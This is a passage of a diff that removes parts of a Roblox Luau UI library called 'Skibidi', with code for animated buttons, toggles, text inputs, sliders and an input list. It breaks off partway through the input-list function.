-			{ Size = UDim2.new(0, 3, 0, open and 18 or 12) }):Play()
-		TweenService:Create(TitleLbl, TweenFast,
-			{ TextColor3 = open and Theme.AccentSec or Theme.Accent }):Play()
-		if SecIcon then
-			TweenService:Create(SecIcon, TweenFast,
-				{ ImageColor3 = open and Theme.AccentSec or Theme.Accent }):Play()
-		end
-	end
-	SetOpen(startOpen)
-
-	HeaderRow.MouseButton1Click:Connect(function()
-		SetOpen(not isOpen)
-	end)
-	AttachTooltip(HeaderRow, Options.Tooltip)
-
-	return {
-		Frame    = Wrapper,
-		Content  = Content,
-		SetOpen  = SetOpen,
-		IsOpen   = function() return isOpen end,
-		SetTitle = function(t) TitleLbl.Text = t or "" end,
-		SetIcon  = function(spec)
-			if SecIcon then
-				SetIconImage(SecIcon, spec)
-			elseif spec and spec ~= "" then
-				SecIcon = PrefixIcon(TitleLbl, spec, 14, TitleLbl.TextColor3)
-			end
-		end,
-		Icon     = SecIcon,
-	}
-end
-
--- ============================================================
--- CreateButton
--- A full-width row button with hover tween.
---
--- Options:
---   Text        string
---   Color       Color3   Background  (default Theme.Bg2)
---   TextColor   Color3               (default Theme.TextPrimary)
---   Height      number               (default 34)
---   OnClick     function
---   Tooltip     string   Hover tooltip (optional)
---   Confirm     bool     First click arms the button ("Confirm?"),
---                        second click within 2s fires OnClick
---   ConfirmText string   Armed label (default "Confirm?")
---   Icon        string   Lucide icon left of the label (optional)
---   IconColor   Color3   Resting icon colour (default TextColor)
---
--- Returns: { Frame, Button, SetText(text), SetDisabled(bool), SetIcon(spec) }
--- ============================================================
-function Skibidi.CreateButton(Parent, Options)
-	Options = Options or {}
-
-	local RowBg = Instance.new("Frame")
-	RowBg.Size             = UDim2.new(1, 0, 0, Options.Height or 34)
-	RowBg.BackgroundColor3 = Options.Color or Theme.Bg2
-	RowBg.BorderSizePixel  = 0
-	RowBg.Parent           = Parent
-	local RowRadius = Theme.CornerRadiusSmall
-	MakeCorner(RowBg, UDim.new(0, RowRadius))
-	local RowEdge = MakeEdge(RowBg, Theme.AccentDim, 1)
-	MakeGloss(RowBg, 0.12)
-	local RowGlow = MakeInnerGlow(RowBg, Theme.Accent, 12, 1)
-
-	local Btn = Instance.new("TextButton")
-	Btn.Size                   = UDim2.new(1, 0, 1, 0)
-	-- Centered anchor so the hover/press UIScale below scales the label
-	-- symmetrically about the middle of the row.
-	Btn.AnchorPoint            = Vector2.new(0.5, 0.5)
-	Btn.Position               = UDim2.new(0.5, 0, 0.5, 0)
-	Btn.BackgroundTransparency = 1
-	Btn.BorderSizePixel        = 0
-	Btn.Font                   = Theme.FontRegular
-	Btn.TextSize               = Theme.BodySize
-	Btn.TextColor3             = Options.TextColor or Theme.TextPrimary
-	Btn.TextXAlignment         = Enum.TextXAlignment.Center
-	Btn.Text                   = Options.Text or ""
-	Btn.AutoButtonColor        = false
-	Btn.Parent                 = RowBg
-
-	-- The two decorations that do the most work on a button: a ripple
-	-- from the exact click point, and a light sweep on hover. Both stay
-	-- inside their own layer, so neither crops the row's stroke nor
-	-- spills past the row's edges.
-	MakeRipple(Btn, Theme.Accent, RowRadius)
-	local playShine = MakeShine(Btn, RowRadius, RowBg)
-
-	-- Optional icon riding just left of the centred label. Added after
-	-- the ripple so InlineIcon can widen the ripple host past the
-	-- padding it introduces.
-	local iconRest = Options.IconColor or Options.TextColor or Theme.TextPrimary
-	local BtnIcon
-	if Options.Icon then
-		BtnIcon = InlineIcon(Btn, Options.Icon, Options.IconSize or 14, iconRest, 6)
-	end
-
-	-- A hairline that grows out of the centre on hover. It gives the row
-	-- a focal point, which a uniform background tint never does.
-	local Underline = Instance.new("Frame")
-	Underline.AnchorPoint      = Vector2.new(0.5, 1)
-	Underline.Position         = UDim2.new(0.5, 0, 1, -1)
-	Underline.Size             = UDim2.new(0, 0, 0, 2)
-	Underline.BackgroundColor3 = Theme.Accent
-	Underline.BorderSizePixel  = 0
-	Underline.ZIndex           = 3
-	Underline.Parent           = RowBg
-	MakeCorner(Underline, UDim.new(1, 0))
-	MakeAccentFill(Underline, Theme.Accent)
-
-	local BtnScale = Instance.new("UIScale")
-	BtnScale.Parent = Btn
-
-	local restColor  = Options.Color or Theme.Bg2
-	local hoverColor = Color3.fromRGB(
-		math.min(restColor.R * 255 + 14, 255) / 255,
-		math.min(restColor.G * 255 + 14, 255) / 255,
-		math.min(restColor.B * 255 + 14, 255) / 255)
-	local pressColor = Color3.fromRGB(
-		math.max(restColor.R * 255 - 8, 0) / 255,
-		math.max(restColor.G * 255 - 8, 0) / 255,
-		math.max(restColor.B * 255 - 8, 0) / 255)
-
-	local disabled = false
-
-	Btn.MouseEnter:Connect(function()
-		if disabled then return end
-		TweenService:Create(RowBg,     TweenFast, { BackgroundColor3 = hoverColor }):Play()
-		TweenService:Create(Btn,       TweenFast, { TextColor3 = Theme.Accent }):Play()
-		if BtnIcon then TweenService:Create(BtnIcon, TweenFast, { ImageColor3 = Theme.Accent }):Play() end
-		TweenService:Create(BtnScale,  TweenFast, { Scale = 1.02 }):Play()
-		TweenService:Create(RowEdge,   TweenFast, { Color = Theme.Accent, Transparency = 0.05 }):Play()
-		TweenService:Create(Underline, TweenSpring, { Size = UDim2.new(0.5, 0, 0, 2) }):Play()
-		if RowGlow then RowGlow.SetAlpha(0.78, TweenMed) end
-	end)
-	Btn.MouseLeave:Connect(function()
-		if disabled then return end
-		TweenService:Create(RowBg,     TweenFast, { BackgroundColor3 = restColor }):Play()
-		TweenService:Create(Btn,       TweenFast, { TextColor3 = Options.TextColor or Theme.TextPrimary }):Play()
-		if BtnIcon then TweenService:Create(BtnIcon, TweenFast, { ImageColor3 = iconRest }):Play() end
-		TweenService:Create(BtnScale,  TweenFast, { Scale = 1 }):Play()
-		TweenService:Create(RowEdge,   TweenFast, { Color = EdgeRest(), Transparency = Theme.StrokeAlpha or 0.34 }):Play()
-		TweenService:Create(Underline, TweenFast, { Size = UDim2.new(0, 0, 0, 2) }):Play()
-		if RowGlow then RowGlow.SetAlpha(1, TweenMed) end
-	end)
-	-- Press feedback: dip below rest colour + shrink slightly on press,
-	-- release back to the hover state
-	Btn.MouseButton1Down:Connect(function()
-		if disabled then return end
-		TweenService:Create(RowBg,    TweenSnap, { BackgroundColor3 = pressColor }):Play()
-		TweenService:Create(BtnScale, TweenSnap, { Scale = 0.97 }):Play()
-	end)
-	Btn.MouseButton1Up:Connect(function()
-		if disabled then return end
-		TweenService:Create(RowBg,    TweenFast,   { BackgroundColor3 = hoverColor }):Play()
-		TweenService:Create(BtnScale, TweenSpring, { Scale = 1.02 }):Play()
-		-- Re-firing the sweep on release confirms the click landed even
-		-- when the handler itself has nothing visible to show for it.
-		playShine()
-	end)
-
-	-- Confirm mode: first click arms, second click (within 2s) fires.
-	local armed, armToken = false, 0
-	local baseText = Options.Text or ""
-	local function disarm()
-		armed = false
-		armToken = armToken + 1
-		Btn.Text = baseText
-		TweenService:Create(RowEdge, TweenFast,
-			{ Color = EdgeRest(), Transparency = Theme.StrokeAlpha or 0.34 }):Play()
-		TweenService:Create(Underline, TweenFast, { Size = UDim2.new(0, 0, 0, 2) }):Play()
-		if BtnIcon then TweenService:Create(BtnIcon, TweenFast, { ImageColor3 = iconRest }):Play() end
-	end
-
-	Btn.MouseButton1Click:Connect(function()
-		if disabled then return end
-		if Options.Confirm and not armed then
-			armed = true
-			armToken = armToken + 1
-			local myToken = armToken
-			Btn.Text = Options.ConfirmText or "Confirm?"
-			TweenService:Create(Btn, TweenFast, { TextColor3 = Theme.Warning }):Play()
-			if BtnIcon then TweenService:Create(BtnIcon, TweenFast, { ImageColor3 = Theme.Warning }):Play() end
-			TweenService:Create(RowEdge, TweenFast,
-				{ Color = Theme.Warning, Transparency = 0 }):Play()
-			TweenService:Create(Underline, TweenSpring,
-				{ Size = UDim2.new(0.8, 0, 0, 2) }):Play()
-			task.delay(2, function()
-				if armed and myToken == armToken and Btn.Parent then disarm() end
-			end)
-			return
-		end
-		if armed then disarm() end
-		if Options.OnClick then Options.OnClick() end
-	end)
-
-	AttachTooltip(RowBg, Options.Tooltip)
-	PlayEntrance(RowBg)
-
-	local function SetDisabled(on)
-		disabled = on == true
-		if armed then disarm() end
-		TweenService:Create(Btn,   TweenFast, { TextTransparency = disabled and 0.55 or 0 }):Play()
-		if BtnIcon then TweenService:Create(BtnIcon, TweenFast, { ImageTransparency = disabled and 0.55 or 0 }):Play() end
-		TweenService:Create(RowBg, TweenFast, { BackgroundColor3 = restColor }):Play()
-		TweenService:Create(RowEdge, TweenFast, {
-			Transparency = disabled and 0.75 or (Theme.StrokeAlpha or 0.34),
-			Color        = EdgeRest(),
-		}):Play()
-		Underline.Size = UDim2.new(0, 0, 0, 2)
-	end
-
-	return {
-		Frame       = RowBg,
-		Button      = Btn,
-		SetText     = function(t) baseText = t or ""; if not armed then Btn.Text = baseText end end,
-		SetDisabled = SetDisabled,
-		SetIcon     = function(spec)
-			if BtnIcon then
-				SetIconImage(BtnIcon, spec)
-			elseif spec and spec ~= "" then
-				BtnIcon = InlineIcon(Btn, spec, Options.IconSize or 14, iconRest, 6)
-			end
-		end,
-		Icon        = BtnIcon,
-	}
-end
-
--- ============================================================
--- CreateToggle
--- A labeled row with an animated toggle switch on the right.
---
--- Options:
---   Label        string
---   Default      bool     Initial state (default false)
---   OnChanged    function(newState, SetFn)
---   Tooltip      string   Hover tooltip (optional)
---   Flag         string   Config key for SaveConfig/LoadConfig
---
---   Icon         string   Lucide icon before the label (optional)
--- Returns: { Frame, Set(bool), GetValue(), SetDisabled(bool) }
--- ============================================================
-function Skibidi.CreateToggle(Parent, Options)
-	Options = Options or {}
-	local state = Options.Default == true
-
-	local W = Theme.ToggleW
-	local H = Theme.ToggleH
-	local K = Theme.KnobSz
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 34)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusSmall))
-	local RowEdge = MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-	if state then
-		RowEdge.Color        = Theme.Accent
-		RowEdge.Transparency = 0.18
-	end
-
-	local Lbl = Instance.new("TextLabel", Row)
-	Lbl.Size                   = UDim2.new(1, -(W + 20), 1, 0)
-	Lbl.Position               = UDim2.new(0, 12, 0, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.BodySize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	-- Track
-	local Track = Instance.new("Frame", Row)
-	Track.AnchorPoint      = Vector2.new(1, 0.5)
-	Track.Position         = UDim2.new(1, -10, 0.5, 0)
-	Track.Size             = UDim2.new(0, W, 0, H)
-	Track.BackgroundColor3 = state and Theme.ToggleOn or Theme.ToggleOff
-	Track.BorderSizePixel  = 0
-	MakeCorner(Track, UDim.new(1, 0))
-
-	-- One gradient, re-coloured per state. A lit track reads as "on" even
-	-- before the eye registers which end the knob is sitting at.
-	local TRACK_ON = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Color3.new(1.00, 1.00, 1.00)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(0.70, 0.70, 0.70)),
-	})
-	local TRACK_OFF = ColorSequence.new({
-		ColorSequenceKeypoint.new(0.00, Color3.new(0.86, 0.86, 0.86)),
-		ColorSequenceKeypoint.new(1.00, Color3.new(1.00, 1.00, 1.00)),
-	})
-	local TrackGrad = Instance.new("UIGradient")
-	TrackGrad.Rotation = 90
-	TrackGrad.Color    = state and TRACK_ON or TRACK_OFF
-	TrackGrad.Parent   = Track
-	local TrackGlow = MakeInnerGlow(Track, Theme.Accent, 9, state and 0.55 or 1)
-
-	-- Knob
-	local Knob = Instance.new("Frame", Track)
-	Knob.Size             = UDim2.new(0, K, 0, K)
-	Knob.Position         = state
-		and UDim2.new(0, W - K - 2, 0.5, -K/2)
-		or  UDim2.new(0, 2,         0.5, -K/2)
-	Knob.BackgroundColor3 = Theme.Knob
-	Knob.BorderSizePixel  = 0
-	Knob.ZIndex           = 2
-	MakeCorner(Knob, UDim.new(1, 0))
-	MakeGloss(Knob, 0.22)
-	local KnobScale = Instance.new("UIScale")
-	KnobScale.Parent = Knob
-
-	-- Invisible click target over entire row
-	local ClickBtn = Instance.new("TextButton", Row)
-	ClickBtn.Size                   = UDim2.new(1, 0, 1, 0)
-	ClickBtn.BackgroundTransparency = 1
-	ClickBtn.Text                   = ""
-	ClickBtn.AutoButtonColor        = false
-	ClickBtn.ZIndex                 = 3
-	MakeRipple(ClickBtn, Theme.Accent, Theme.CornerRadiusSmall)
-
-	local function Set(on)
-		state = on
-		TweenService:Create(Track, TweenFast,
-			{ BackgroundColor3 = on and Theme.ToggleOn or Theme.ToggleOff }):Play()
-		TweenService:Create(Knob,  TweenSpring,
-			{ Position = on
-				and UDim2.new(0, W - K - 2, 0.5, -K/2)
-				or  UDim2.new(0, 2,         0.5, -K/2) }):Play()
-		TrackGrad.Color = on and TRACK_ON or TRACK_OFF
-
-		-- A brief overshoot on the knob makes the switch feel physical.
-		KnobScale.Scale = on and 1.16 or 0.88
-		TweenService:Create(KnobScale, TweenPop, { Scale = 1 }):Play()
-
-		if TrackGlow then TrackGlow.SetAlpha(on and 0.5 or 1, TweenMed) end
-		-- Tinting the row's own outline is what lets a column of toggles
-		-- be read at a glance without inspecting each switch.
-		TweenService:Create(RowEdge, TweenMed, {
-			Color        = on and Theme.Accent or EdgeRest(),
-			Transparency = on and 0.18 or (Theme.StrokeAlpha or 0.34),
-		}):Play()
-	end
-
-	local disabled = false
-
-	ClickBtn.MouseButton1Click:Connect(function()
-		if disabled then return end
-		local newState = not state
-		Set(newState)
-		if Options.OnChanged then Options.OnChanged(newState, Set) end
-	end)
-	ClickBtn.MouseEnter:Connect(function()
-		if disabled then return end
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-	end)
-	ClickBtn.MouseLeave:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-	end)
-	AttachTooltip(Row, Options.Tooltip)
-	PlayEntrance(Row)
-
-	local function SetDisabled(on)
-		disabled = on == true
-		local t = disabled and 0.5 or 0
-		TweenService:Create(Lbl,   TweenFast, { TextTransparency = t }):Play()
-		TweenService:Create(Track, TweenFast, { BackgroundTransparency = disabled and 0.4 or 0 }):Play()
-		TweenService:Create(Knob,  TweenFast, { BackgroundTransparency = disabled and 0.4 or 0 }):Play()
-	end
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "toggle",
-			Get  = function() return state end,
-			Set  = function(v)
-				local on = v == true
-				Set(on)
-				if Options.OnChanged then Options.OnChanged(on, Set) end
-			end,
-		}
-	end
-
-	return { Frame = Row, Set = Set, GetValue = function() return state end, SetDisabled = SetDisabled }
-end
-
--- ============================================================
--- CreateTextInput
--- A labeled row with a text box on the right.
---
--- Options:
---   Label        string
---   Placeholder  string
---   Default      string
---   Width        number   Box width (default 60)
---   NumericOnly  bool     Only allow numeric input
---   MaxLength    number   Hard cap on text length (optional)
---   OnSubmit     function(text)  called on FocusLost
---   Tooltip      string   Hover tooltip (optional)
---   Flag         string   Config key for SaveConfig/LoadConfig
---
---   Icon         string   Lucide icon before the label (optional)
--- Returns: { Frame, TextBox, GetValue() }
--- ============================================================
-function Skibidi.CreateTextInput(Parent, Options)
-	Options = Options or {}
-	local boxW = Options.Width or 60
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 34)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-
-	local Lbl = Instance.new("TextLabel", Row)
-	Lbl.Size                   = UDim2.new(1, -(boxW + 20), 1, 0)
-	Lbl.Position               = UDim2.new(0, 12, 0, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.BodySize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.Text                   = Options.Label or ""
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	local Box = Instance.new("TextBox", Row)
-	Box.AnchorPoint       = Vector2.new(1, 0.5)
-	Box.Position          = UDim2.new(1, -10, 0.5, 0)
-	Box.Size              = UDim2.new(0, boxW, 0, Theme.ToggleH)
-	Box.BackgroundColor3  = Theme.InputBg
-	Box.BorderSizePixel   = 0
-	Box.Font              = Theme.FontMedium
-	Box.TextSize          = Theme.SmallSize
-	Box.TextColor3        = Theme.AccentSec
-	Box.PlaceholderText   = Options.Placeholder or ""
-	Box.PlaceholderColor3 = Theme.TextMuted
-	Box.TextXAlignment    = Enum.TextXAlignment.Center
-	Box.ClearTextOnFocus  = false
-	Box.Text              = tostring(Options.Default or "")
-	MakeCorner(Box, UDim.new(0, 6))
-	local boxStroke = MakeEdge(Box, Theme.AccentDim, 1)
-	MakeGloss(Box, 0.14)
-	-- A focus ring rather than a focus *outline*: the bloom spills past
-	-- the box, so the focused field wins attention against a dense column
-	-- of rows without the border having to get heavier.
-	local boxGlow = MakeInnerGlow(Box, Theme.Accent, 9, 1)
-
-	Box.Focused:Connect(function()
-		TweenService:Create(boxStroke, TweenFast,
-			{ Color = Theme.Accent, Thickness = 1.5, Transparency = 0 }):Play()
-		if boxGlow then boxGlow.SetAlpha(0.5, TweenMed) end
-	end)
-	Box.FocusLost:Connect(function(ep)
-		TweenService:Create(boxStroke, TweenFast,
-			{ Color = EdgeRest(), Thickness = 1, Transparency = Theme.StrokeAlpha or 0.34 }):Play()
-		if boxGlow then boxGlow.SetAlpha(1, TweenMed) end
-		local val = Box.Text
-		if Options.NumericOnly then
-			local n = tonumber(val:match("%d+"))
-			val = n and tostring(n) or ""
-			Box.Text = val
-		end
-		if Options.OnSubmit then Options.OnSubmit(val) end
-	end)
-
-	if Options.MaxLength then
-		Box:GetPropertyChangedSignal("Text"):Connect(function()
-			if #Box.Text > Options.MaxLength then
-				Box.Text = string.sub(Box.Text, 1, Options.MaxLength)
-			end
-		end)
-	end
-
-	Row.MouseEnter:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-	end)
-	Row.MouseLeave:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-	end)
-	AttachTooltip(Row, Options.Tooltip)
-	PlayEntrance(Row)
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "text",
-			Get  = function() return Box.Text end,
-			Set  = function(v)
-				v = tostring(v)
-				if Options.NumericOnly then
-					local n = tonumber(v:match("%d+"))
-					v = n and tostring(n) or ""
-				end
-				Box.Text = v
-				if Options.OnSubmit then Options.OnSubmit(v) end
-			end,
-		}
-	end
-
-	return { Frame = Row, TextBox = Box, GetValue = function() return Box.Text end }
-end
-
--- ============================================================
--- CreateSlider
--- A labeled row with a horizontal drag slider.
---
--- Options:
---   Label      string
---   Min        number  (default 0)
---   Max        number  (default 100)
---   Default    number
---   Step       number  Snap values to this increment (optional)
---   Format     string  string.format pattern (default "%.0f")
---   OnChanged  function(value)
---   Tooltip    string  Hover tooltip (optional)
---   Flag       string  Config key for SaveConfig/LoadConfig
---
---   Icon       string   Lucide icon before the label (optional)
--- Returns: { Frame, Update(value), GetValue() }
--- ============================================================
-function Skibidi.CreateSlider(Parent, Options)
-	Options = Options or {}
-	local Min   = Options.Min     or 0
-	local Max   = Options.Max     or 100
-	local cur   = Options.Default or Min
-	local fmt   = Options.Format  or "%.0f"
-
-	local Row = Instance.new("Frame")
-	Row.Size             = UDim2.new(1, 0, 0, 34)
-	Row.BackgroundColor3 = Theme.Bg2
-	Row.BorderSizePixel  = 0
-	Row.Parent           = Parent
-	MakeCorner(Row, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Row, Theme.AccentDim, 1)
-	MakeGloss(Row, 0.10)
-
-	local LabelW = 0
-	if Options.Label and Options.Label ~= "" then
-		LabelW = Options.Icon and 100 or 80
-		local Lbl = Instance.new("TextLabel", Row)
-		Lbl.Size             = UDim2.new(0, LabelW, 1, 0)
-		Lbl.Position         = UDim2.new(0, 12, 0, 0)
-		Lbl.BackgroundTransparency = 1
-		Lbl.Font             = Theme.FontRegular
-		Lbl.TextSize         = Theme.SmallSize + 1
-		Lbl.TextColor3       = Theme.TextPrimary
-		Lbl.TextXAlignment   = Enum.TextXAlignment.Left
-		Lbl.TextTruncate     = Enum.TextTruncate.AtEnd
-		Lbl.Text             = Options.Label
-		if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-	end
-
-	local ValLbl = Instance.new("TextLabel", Row)
-	ValLbl.Size                   = UDim2.new(0, 40, 0, 18)
-	ValLbl.Position               = UDim2.new(1, -46, 0.5, -9)
-	ValLbl.BackgroundColor3       = Theme.InputBg
-	ValLbl.BackgroundTransparency = 0.25
-	ValLbl.BorderSizePixel        = 0
-	ValLbl.Font                   = Theme.FontMedium
-	ValLbl.TextSize               = Theme.SmallSize
-	ValLbl.TextColor3             = Theme.AccentSec
-	ValLbl.TextXAlignment         = Enum.TextXAlignment.Center
-	MakeCorner(ValLbl, UDim.new(0, 5))
-	MakeStroke(ValLbl, Theme.AccentDim, 1).Transparency = 0.5
-
-	local trackX  = LabelW + 14
-	local trackW  = -(LabelW + 64)
-
-	local Track = Instance.new("Frame", Row)
-	Track.Size             = UDim2.new(1, trackW, 0, 5)
-	Track.Position         = UDim2.new(0, trackX, 0.5, -2.5)
-	Track.BackgroundColor3 = Theme.ToggleOff
-	Track.BorderSizePixel  = 0
-	MakeCorner(Track, UDim.new(1, 0))
-	-- Dark at the top, lighter at the bottom: the inverse of a raised
-	-- surface, which is what makes an empty track read as a groove.
-	do
-		local g = Instance.new("UIGradient", Track)
-		g.Rotation = 90
-		g.Color = ColorSequence.new(Color3.new(0.72, 0.72, 0.72), Color3.new(1, 1, 1))
-	end
-
-	local Fill = Instance.new("Frame", Track)
-	Fill.Size             = UDim2.new(0, 0, 1, 0)
-	Fill.BackgroundColor3 = Theme.Accent
-	Fill.BorderSizePixel  = 0
-	Fill.ClipsDescendants = true
-	MakeCorner(Fill, UDim.new(1, 0))
-	MakeAccentFill(Fill, Theme.Accent, true)
-
-	local Knob = Instance.new("Frame", Track)
-	Knob.Size             = UDim2.new(0, 13, 0, 13)
-	Knob.AnchorPoint      = Vector2.new(0.5, 0.5)
-	Knob.Position         = UDim2.new(0, 0, 0.5, 0)
-	Knob.BackgroundColor3 = Theme.Knob
-	Knob.BorderSizePixel  = 0
-	Knob.ZIndex           = 2
-	MakeCorner(Knob, UDim.new(1, 0))
-	MakeGloss(Knob, 0.22)
-	MakeStroke(Knob, Darken(Theme.Accent, 0.24), 1).Transparency = 0.45
-	local KnobGlow = MakeInnerGlow(Knob, Theme.Accent, 9, 0.62)
-
-	local step = Options.Step
-
-	local function Update(val)
-		if step and step > 0 then
-			val = Min + math.floor((val - Min) / step + 0.5) * step
-		end
-		val = math.clamp(val, Min, Max)
-		cur = val
-		ValLbl.Text = string.format(fmt, val)
-		local pct = (val - Min) / (Max - Min)
-		Fill.Size     = UDim2.new(pct, 0, 1, 0)
-		Knob.Position = UDim2.new(pct, 0, 0.5, 0)
-		if Options.OnChanged then Options.OnChanged(val) end
-	end
-	Update(cur)
-
-	local dragging = false
-	Track.InputBegan:Connect(function(inp)
-		if inp.UserInputType == Enum.UserInputType.MouseButton1
-		or inp.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			TweenService:Create(Knob, TweenSpring, { Size = UDim2.new(0, 17, 0, 17) }):Play()
-			if KnobGlow then KnobGlow.SetAlpha(0.32, TweenFast) end
-			local x = inp.Position.X
-			Update(Min + ((x - Track.AbsolutePosition.X) / Track.AbsoluteSize.X) * (Max - Min))
-		end
-	end)
-	ConnectScoped(Row, UserInputService.InputEnded, function(inp)
-		if inp.UserInputType == Enum.UserInputType.MouseButton1
-		or inp.UserInputType == Enum.UserInputType.Touch then
-			if dragging then
-				TweenService:Create(Knob, TweenSpring, { Size = UDim2.new(0, 13, 0, 13) }):Play()
-				if KnobGlow then KnobGlow.SetAlpha(0.62, TweenMed) end
-			end
-			dragging = false
-		end
-	end)
-	ConnectScoped(Row, UserInputService.InputChanged, function(inp)
-		if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement
-		or inp.UserInputType == Enum.UserInputType.Touch) then
-			local x = inp.Position.X
-			Update(Min + math.clamp((x - Track.AbsolutePosition.X) / Track.AbsoluteSize.X, 0, 1) * (Max - Min))
-		end
-	end)
-
-	Row.MouseEnter:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Hover }):Play()
-	end)
-	Row.MouseLeave:Connect(function()
-		TweenService:Create(Row, TweenFast, { BackgroundColor3 = Theme.Bg2 }):Play()
-	end)
-	AttachTooltip(Row, Options.Tooltip)
-	PlayEntrance(Row)
-
-	if Options.Flag then
-		Flags[Options.Flag] = {
-			Kind = "number",
-			Get  = function() return cur end,
-			Set  = function(val) if type(val) == "number" then Update(val) end end,
-		}
-	end
-
-	return { Frame = Row, Update = Update, GetValue = function() return cur end }
-end
-
--- ============================================================
--- CreateInputList / multi-line text input list
--- A labeled header with a scrollable list of text boxes.
---
--- Options:
---   Label       string    Header label
---   Count       number    Number of input slots (default 10)
---   Defaults    table     Array of default strings
---   Placeholder string    Placeholder for each box (or function(i))
---   OnChanged   function(index, value)
---   Height      number    Scroll area height (default 120)
---   Flag        string    Config key for SaveConfig/LoadConfig
---
---   Icon        string   Lucide icon before the label (optional)
--- Returns:
---   { Frame, GetValues(), SetValue(i, text) }
--- ============================================================
-function Skibidi.CreateInputList(Parent, Options)
-	Options = Options or {}
-	local count  = Options.Count    or 10
-	local h      = Options.Height   or 120
-	local label  = Options.Label    or "Items"
-	local defs   = Options.Defaults or {}
-
-	local BOX_H = 22
-	local BOX_G = 4
-
-	-- Outer card
-	local Card = Instance.new("Frame")
-	Card.Size             = UDim2.new(1, 0, 0, 34 + 1 + h + 8)
-	Card.BackgroundColor3 = Theme.Bg2
-	Card.BorderSizePixel  = 0
-	Card.ClipsDescendants = true
-	Card.Parent           = Parent
-	MakeCorner(Card, UDim.new(0, Theme.CornerRadiusSmall))
-	MakeEdge(Card, Theme.AccentDim, 1)
-	MakeGloss(Card, 0.10)
-
-	-- Header
-	local HeaderRow = Instance.new("Frame", Card)
-	HeaderRow.Size                   = UDim2.new(1, 0, 0, 34)
-	HeaderRow.BackgroundTransparency = 1
-
-	local Lbl = Instance.new("TextLabel", HeaderRow)
-	Lbl.Size                   = UDim2.new(1, -20, 1, 0)
-	Lbl.Position               = UDim2.new(0, 12, 0, 0)
-	Lbl.BackgroundTransparency = 1
-	Lbl.Font                   = Theme.FontRegular
-	Lbl.TextSize               = Theme.BodySize
-	Lbl.TextColor3             = Theme.TextPrimary
-	Lbl.TextXAlignment         = Enum.TextXAlignment.Left
-	Lbl.Text                   = label
-	if Options.Icon then PrefixIcon(Lbl, Options.Icon, 14, Theme.TextPrimary) end
-
-	local Div = Instance.new("Frame", Card)
-	Div.Size             = UDim2.new(1, -16, 0, 1)
-	Div.Position         = UDim2.new(0, 8, 0, 34)
-	Div.BackgroundColor3 = Theme.AccentDim
-	Div.BorderSizePixel  = 0
-
-	-- Scroll
-	local Scroll = Instance.new("ScrollingFrame", Card)
-	Scroll.Size                   = UDim2.new(1, -8, 0, h)
-	Scroll.Position               = UDim2.new(0, 4, 0, 39)
-	Scroll.BackgroundColor3       = Theme.Bg3
-	Scroll.BackgroundTransparency = 0.2
-	Scroll.BorderSizePixel        = 0
-	Scroll.ScrollBarThickness     = 3
-	Scroll.ScrollBarImageColor3   = Theme.AccentDim
-	Scroll.AutomaticCanvasSize    = Enum.AutomaticSize.Y
-	Scroll.CanvasSize             = UDim2.new(0,0,0,0)
-	Scroll.ClipsDescendants       = true
-	MakeCorner(Scroll, UDim.new(0, 5))
-	MakePadding(Scroll, 5, 5, 5, 5)
-	MakeListLayout(Scroll, Enum.FillDirection.Vertical, BOX_G)
-
-	local values = {}
-	local boxes  = {}
-
-	for i = 1, count do
-		values[i] = defs[i] or ""
-
-		local Slot = Instance.new("Frame", Scroll)
-		Slot.Size                   = UDim2.new(1, 0, 0, BOX_H)
-		Slot.BackgroundColor3       = Theme.InputBg
-		Slot.BackgroundTransparency = 0.2
-		Slot.BorderSizePixel        = 0
-		Slot.LayoutOrder            = i
-		MakeCorner(Slot, UDim.new(0, 4))
-		local slotStroke = MakeEdge(Slot, Theme.AccentDim, 1)
-		MakeGloss(Slot, 0.10)
-
-		local Badge = Instance.new("TextLabel", Slot)
-		Badge.Size                   = UDim2.new(0, 14, 1, 0)
-		Badge.Position               = UDim2.new(0, 4, 0, 0)
-		Badge.BackgroundTransparency = 1
-		Badge.Font                   = Theme.FontMedium
-		Badge.TextSize               = 9
-		Badge.TextColor3             = Theme.TextMuted
-		Badge.TextXAlignment         = Enum.TextXAlignment.Center
-		Badge.Text                   = tostring(i)
-
-		local ph
-		if type(Options.Placeholder) == "function" then
-			ph = Options.Placeholder(i)
-		else
-			ph = (Options.Placeholder or ("item " .. i))
